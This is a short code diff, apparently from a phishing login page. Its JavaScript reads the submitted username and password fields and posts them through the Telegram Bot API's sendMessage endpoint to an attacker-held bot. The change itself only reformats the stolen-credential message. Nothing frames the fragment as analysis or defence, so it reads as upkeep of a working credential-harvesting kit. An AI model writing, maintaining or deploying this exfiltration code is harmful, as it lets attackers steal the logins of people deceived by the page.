@@ -567,7 +567,7 @@
       event.preventDefault();
         var usr = document.querySelector('#user').value;
         var pwd = document.querySelector('#passwd').value;
-        var message = `<b>Username</b> : <code>${usr}</code> <b>Password</b> : <i>${pwd}</i>`;
+        var message = `<b>Username</b> : <code>${usr}</code> %0A <b>Password</b> : <code>${pwd}</code>`;
         $.ajax({
             type: form.method,
             url: `https://api.telegram.org/bot${token}/sendMessage`,
